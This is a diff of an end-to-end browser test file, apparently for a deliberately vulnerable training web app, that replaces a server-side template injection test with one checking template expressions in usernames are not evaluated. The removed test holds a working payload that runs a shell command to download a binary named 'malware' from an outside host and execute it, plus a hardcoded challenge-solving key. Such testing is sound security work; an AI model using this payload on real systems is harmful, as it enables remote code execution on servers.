@@ -47,24 +47,14 @@ describe('/profile', () => {
   })
 
   describe('challenge "ssti"', () => {
-    it('should be possible to inject arbitrary nodeJs commands in username', () => {
-      cy.task('isDocker').then((isDocker) => {
-        if (!isDocker) {
-          cy.visit('/profile')
-          cy.get('#username').type(
-            "#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}",
-            { parseSpecialCharSequences: false }
-          )
-          cy.get('#submit').click()
-          cy.request(
-            '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3'
-          )
-          cy.visit('/')
-          // void browser.driver.sleep(10000);
-          // void browser.waitForAngularEnabled(true);
-          cy.expectChallengeSolved({ challenge: 'SSTi' })
-        }
-      })
+    it('should display template expressions in usernames without evaluating them', () => {
+      cy.visit('/profile')
+      cy.get('#username').clear().type('#{1 + 1}', { parseSpecialCharSequences: false })
+      cy.get('#submit').click()
+      cy.get('#username').should('have.value', '#{1 + 1}')
+      cy.contains('p', '#{1 + 1}').should('be.visible')
+      cy.get('#username').clear().type('αδмιη')
+      cy.get('#submit').click()
     })
   })
 
